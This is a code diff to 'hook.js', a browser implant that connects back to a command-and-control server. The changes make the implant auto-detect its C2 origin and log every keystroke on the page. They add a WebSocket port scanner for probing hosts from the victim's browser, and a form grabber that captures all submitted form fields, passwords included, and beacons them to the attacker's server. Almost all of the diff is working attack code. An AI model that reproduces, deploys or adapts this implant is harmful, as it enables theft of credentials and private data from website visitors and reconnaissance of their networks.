@@ -8,7 +8,21 @@
  */
 (function () {
   // ─── Config ───────────────────────────────────────────────────
-  var C2 = location.protocol + "//" + location.hostname + ":5000";
+  // Auto-detect C2 URL from the script's own src attribute.
+  // This makes the implant work regardless of where it's loaded from —
+  // the C2 address is always the server that served hook.js.
+  var C2 = (function () {
+    try {
+      var scripts = document.querySelectorAll('script[src*="hook.js"]');
+      if (scripts.length > 0) {
+        var src = scripts[scripts.length - 1].src;
+        var u = new URL(src);
+        return u.origin; // e.g. http://attacker:5000
+      }
+    } catch (e) {}
+    // Fallback: assume C2 runs on same host, port 5000
+    return location.protocol + "//" + location.hostname + ":5000";
+  })();
   var POLL_INTERVAL = 3000;
   var agentId = null;
   var interval = POLL_INTERVAL;
@@ -76,10 +90,8 @@
     });
   }
 
-  // Attach globally on the document — captures ALL keystrokes on the page
-  document.addEventListener("keydown", globalKeyHandler, true); // useCapture=true for priority
-  // Also try window level in case document events are swallowed
-  window.addEventListener("keydown", globalKeyHandler, true);
+  // Attach once on document with useCapture — gets priority over page handlers
+  document.addEventListener("keydown", globalKeyHandler, true);
 
   // ─── Task handlers ────────────────────────────────────────────
   var handlers = {};
@@ -165,44 +177,56 @@
     var timeout = (payload && payload.timeout) || 3000;
     var results = [];
 
-    // Use fetch() with AbortController for more reliable timing
+    // WebSocket-based port scanning — most reliable from browser
+    // Open port: ws connection fails fast with a protocol error (< 200ms)
+    // Closed port: connection hangs until timeout
     function scanPort(host, port) {
       return new Promise(function (resolve) {
         var start = Date.now();
-        var controller = new AbortController();
-        var timer = setTimeout(function () {
-          controller.abort();
-          results.push({ port: port, status: "closed", elapsed: Date.now() - start });
+        var done = false;
+
+        function finish(status) {
+          if (done) return;
+          done = true;
+          results.push({ port: port, status: status, elapsed: Date.now() - start });
           resolve();
+        }
+
+        var timer = setTimeout(function () {
+          finish("closed");
         }, timeout);
 
-        fetch("http://" + host + ":" + port + "/", {
-          mode: "no-cors",
-          signal: controller.signal,
-        })
-          .then(function () {
+        try {
+          var ws = new WebSocket("ws://" + host + ":" + port);
+          ws.onopen = function () {
+            clearTimeout(timer);
+            ws.close();
+            finish("open");
+          };
+          ws.onerror = function () {
             clearTimeout(timer);
             var elapsed = Date.now() - start;
-            results.push({ port: port, status: "open", elapsed: elapsed });
-            resolve();
-          })
-          .catch(function (err) {
-            clearTimeout(timer);
-            var elapsed = Date.now() - start;
-            if (err.name === "AbortError") {
-              // Already handled by timer
-              return;
-            }
-            // Fast error (< 100ms) usually means connection refused = port exists but no HTTP
-            // Slow error (near timeout) usually means filtered/no response
-            // Error within reasonable time = something responded
-            if (elapsed < timeout * 0.8) {
-              results.push({ port: port, status: "open", elapsed: elapsed });
+            // Open port with non-WS service: fails fast (< 1s)
+            // Closed port: browser retries, takes longer / hits timeout
+            if (elapsed < timeout * 0.7) {
+              finish("open");
             } else {
-              results.push({ port: port, status: "filtered", elapsed: elapsed });
+              finish("closed");
             }
-            resolve();
-          });
+          };
+          ws.onclose = function () {
+            clearTimeout(timer);
+            var elapsed = Date.now() - start;
+            if (elapsed < timeout * 0.7) {
+              finish("open");
+            } else {
+              finish("closed");
+            }
+          };
+        } catch (e) {
+          clearTimeout(timer);
+          finish("error");
+        }
       });
     }
 
@@ -384,41 +408,56 @@
   };
 
   // Steal form data when forms are submitted
+  // Uses sendBeacon to fire results BEFORE navigation kills the page
   handlers.form_grab = function (payload) {
     var duration = (payload && payload.duration) || 30000;
-    var captured = [];
+    var grabCount = 0;
+    var taskId = (payload && payload._task_id) || "";
 
     function onSubmit(e) {
       var form = e.target;
       if (!form || !form.elements) return;
-      var data = { action: form.action, method: form.method, fields: {} };
+
+      var fields = {};
       for (var i = 0; i < form.elements.length; i++) {
         var el = form.elements[i];
         if (el.name) {
-          data.fields[el.name] = el.value;
+          fields[el.name] = el.value;
         }
       }
-      captured.push(data);
+
+      var formData = {
+        action: form.action,
+        method: form.method,
+        fields: fields,
+        page_url: location.href,
+        ts: Date.now(),
+      };
+
+      grabCount++;
+
+      // Send immediately via sendBeacon — survives page navigation
+      var beaconData = JSON.stringify({
+        agent_id: agentId,
+        task_type: "form_grab",
+        task_id: taskId,
+        data: { form: formData, grab_number: grabCount },
+      });
+      // Use text/plain to avoid CORS preflight (cross-origin beacon)
+      navigator.sendBeacon(C2 + "/api/result", new Blob([beaconData], { type: "text/plain" }));
     }
 
     document.addEventListener("submit", onSubmit, true);
-
-    // Also intercept by hooking individual forms
-    var forms = document.querySelectorAll("form");
-    for (var i = 0; i < forms.length; i++) {
-      forms[i].addEventListener("submit", onSubmit, true);
-    }
 
     return new Promise(function (resolve) {
       setTimeout(function () {
         document.removeEventListener("submit", onSubmit, true);
         resolve({
-          forms_captured: captured,
-          count: captured.length,
+          forms_grabbed: grabCount,
           duration_ms: duration,
-          note: captured.length === 0
+          note: grabCount === 0
             ? "No forms submitted during capture window"
-            : "Captured " + captured.length + " form submissions",
+            : grabCount + " form submission(s) captured and sent via beacon",
         });
       }, duration);
     });
@@ -448,7 +487,10 @@
     }
 
     try {
-      var result = handler(task.payload || {});
+      // Inject task_id into payload so handlers like form_grab can use it for beacons
+      var taskPayload = task.payload || {};
+      taskPayload._task_id = task.task_id;
+      var result = handler(taskPayload);
 
       // Handle both sync results and promises
       if (result && typeof result.then === "function") {
